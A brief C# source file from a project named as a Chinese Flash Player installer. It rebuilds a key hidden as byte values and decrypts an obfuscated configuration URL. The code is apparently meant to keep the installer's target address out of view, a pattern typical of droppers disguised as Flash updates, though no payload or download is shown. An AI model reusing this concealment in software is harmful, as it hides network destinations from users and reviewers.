using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace flashplayerpp_install_cn
{
    public static class EncClass
    {
        public static string akey = "aaasdfdguigvdyudfysfdstyfcdysat6sufiufsdyudgsaydfsaudfayudsaf7uidsafudfa7uidfayudsaydfsayuda";
        public static void Run()
        {
            //解密
            byte[] bytes = new byte[] { 0x79,
0x00,
0x76,
0x00,
0x66,
0x00,
0x76,
0x00,
0x73,
0x00,
0x64,
0x00,
0x74,
0x00,
0x35,
0x00,
0x36,
0x00,
0x74,
0x00,
0x66,
0x00,
0x67,
0x00,
0x75,
0x00,
0x6a,
0x00};
            char[] chars = new char[bytes.Length / sizeof(char)];
            System.Buffer.BlockCopy(bytes, 0, chars, 0, bytes.Length);
            String key =  new string(chars);
            String Desc = Enc.DecryptBase64StringToString(Config.URL, key);
            Config.URL = Desc;
            //
        }
    }
}
